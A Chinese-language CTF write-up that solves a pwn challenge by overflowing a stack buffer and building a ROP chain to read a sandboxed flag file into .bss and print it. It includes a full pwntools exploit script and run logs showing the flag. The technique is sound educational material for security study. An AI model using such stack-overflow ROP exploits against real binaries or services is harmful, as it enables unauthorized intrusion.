# 调皮的文件

上一题给了 libc ，这题不光没给 libc ，而且 `checksed` 检查结果显示：

```bash
(sage) scetayh@yuprae-gentoo ~/Projects/0xgame2026-writeups/week2/pwn/5 $ checksec --file=pwn
[*] '/home/scetayh/Projects/0xgame2026-writeups/week2/pwn/5/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

没有 PIE 。也就是说这次应该没有偏移的问题。先观察一下 `main` ：

```c
  setup_seccomp(a1: v6, a2: v7, a3: v4, a4: v5, a5: v8, a6: v9);
  vuln();
```

有 `seccomp` ，内部包含这样一条语句：

```c
prctl(option: 38, 1, 0, 0, 0, a6, v7, &v8);
```

查阅得到 `prctl` arg 1 的 38 代表 `PR_SET_NO_NEW_PRIVS` ，禁止权限提升。暂时不管它，再看看 `vuln` ：

```c
ssize_t vuln()
{
  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF

  puts(s: "Welcome to the ROP Blind Box!");
  puts(s: "I've already opened the 'flag' for you, its fd is hidden between 3 and 7.");
  puts(s: "Sandbox is ON. Only read & write are allowed.");
  printf(format: "Give me your ROP chain > ");
  return read(fd: 0, buf, nbytes: 0x200u);
}
```

题目已经告诉我们，'flag' 已被打开，文件描述符介于 3 到 7 之间。`main` 函数有一段：

```c
  v3 = time(timer: nullptr);
  srand(seed: v3);
  fd2 = rand() % 5 + 3;
  dup2(fd, fd2);
  if ( fd != fd2 )
    close(fd);
```

推测利用 `read` 缓冲区溢出，将返回地址以及更高地址处依次覆盖，向 RDI 、RSI 、RDX 中分别存储 `read` 的三个参数，最后 `call` `read` 。

仍然是 40 bytes 的 padding 。fd 每次都不同，可以在范围内随便取一个（这里用的是 4 ），多试几次。从 fd 出来的数据写到一片 `.dss` 上，这里使用：

![](1.png)

看看这片地址：

```
.bss:00000000004040A0 ; FILE *stdout
.bss:00000000004040A0 stdout@GLIBC_2_2_5 dq ?                 ; DATA XREF: LOAD:0000000000400548↑o
.bss:00000000004040A0                                         ; init+26↑r
.bss:00000000004040A0                                         ; Alternative name is 'stdout'
.bss:00000000004040A0                                         ; Copy of shared data
.bss:00000000004040A8                 align 10h
.bss:00000000004040B0                 public stdin@GLIBC_2_2_5
.bss:00000000004040B0 ; FILE *stdin
.bss:00000000004040B0 stdin@GLIBC_2_2_5 dq ?                  ; DATA XREF: LOAD:0000000000400560↑o
.bss:00000000004040B0                                         ; init+8↑r
.bss:00000000004040B0                                         ; Alternative name is 'stdin'
.bss:00000000004040B0                                         ; Copy of shared data
.bss:00000000004040B8                 align 20h
.bss:00000000004040C0                 public stderr@GLIBC_2_2_5
.bss:00000000004040C0 ; FILE *stderr
.bss:00000000004040C0 stderr@GLIBC_2_2_5 dq ?                 ; DATA XREF: LOAD:0000000000400578↑o
.bss:00000000004040C0                                         ; init+44↑r
.bss:00000000004040C0                                         ; Alternative name is 'stderr'
.bss:00000000004040C0                                         ; Copy of shared data
.bss:00000000004040C8 completed_0     db ?                    ; DATA XREF: __do_global_dtors_aux+4↑r
.bss:00000000004040C8                                         ; __do_global_dtors_aux+16↑w
.bss:00000000004040C9                 align 20h
.bss:00000000004040E0                 public flag_buf
.bss:00000000004040E0 flag_buf        db    ? ;
.bss:00000000004040E1                 db    ? ;
.bss:00000000004040E2                 db    ? ;
.bss:00000000004040E3                 db    ? ;
.bss:00000000004040E4                 db    ? ;
...
.bss:00000000004041DF                 db    ? ;
.bss:00000000004041DF _bss            ends
.bss:00000000004041DF
```

看起来 `flag_buf` 是特意为我准备的？长度完全够用，所以取此处。

用 `bash` 算一下缓冲区多大：

```bash
(sage) scetayh@yuprae-gentoo ~/Projects/0xgame2026-writeups/week2/pwn/5 $ echo $((0x1DF - 0x0E0 + 1))
256
```

那就 (256)_10 ，也就是 0x100 。

`read` 写完之后用 `put` 打出来即可。总脚本：

```python
from pwn import *

io = remote("nc1.ctfplus.cn", 14555)

padding = 32 + 8

pop_rdi = 0x401303
pop_rsi = 0x401305
pop_rdx = 0x401307

vuln=0x40143F

got_puts = 0x404018

ptl_puts = 0x4010F0
ptl_read = 0x401130

flag_buf = 0x4040E0

payload = (
    b'a' * padding +
    p64(pop_rdi) + p64(4) +
    p64(pop_rsi) + p64(flag_buf) +
    p64(pop_rdx) + p64(0x100) +
    p64(ptl_read) +
    p64(pop_rdi) + p64(flag_buf) +
    p64(ptl_puts)
)

print("[-] payload =", payload)
io.send(payload)

io.interactive()
```

运行：

```bash
(sage) scetayh@yuprae-gentoo ~/Projects/0xgame2026-writeups/week2/pwn/5 $ python3 solve.py 
[+] Opening connection to nc1.ctfplus.cn on port 14555: Done
[-] payload = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x03\x13@\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x05\x13@\x00\x00\x00\x00\x00\xe0@@\x00\x00\x00\x00\x00\x07\x13@\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x000\x11@\x00\x00\x00\x00\x00\x03\x13@\x00\x00\x00\x00\x00\xe0@@\x00\x00\x00\x00\x00\xf0\x10@\x00\x00\x00\x00\x00'
[*] Switching to interactive mode
Welcome to the ROP Blind Box!
I've already opened the 'flag' for you, its fd is hidden between 3 and 7.
Sandbox is ON. Only read & write are allowed.
Give me your ROP chain > $ 
[*] Closed connection to nc1.ctfplus.cn port 14555
```

多试几次，最终：

```bash
(sage) scetayh@yuprae-gentoo ~/Projects/0xgame2026-writeups/week2/pwn/5 $ python3 solve.py 
[+] Opening connection to nc1.ctfplus.cn on port 14555: Done
[-] payload = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x03\x13@\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x05\x13@\x00\x00\x00\x00\x00\xe0@@\x00\x00\x00\x00\x00\x07\x13@\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x000\x11@\x00\x00\x00\x00\x00\x03\x13@\x00\x00\x00\x00\x00\xe0@@\x00\x00\x00\x00\x00\xf0\x10@\x00\x00\x00\x00\x00'
[*] Switching to interactive mode
Welcome to the ROP Blind Box!
I've already opened the 'flag' for you, its fd is hidden between 3 and 7.
Sandbox is ON. Only read & write are allowed.
Give me your ROP chain > 0xGame{22ccfdfe-f2b7-456e-b0e0-688506ab1976}

[*] Got EOF while reading in interactive
$  
```

得到 flag 为 `0xGame{22ccfdfe-f2b7-456e-b0e0-688506ab1976}` 。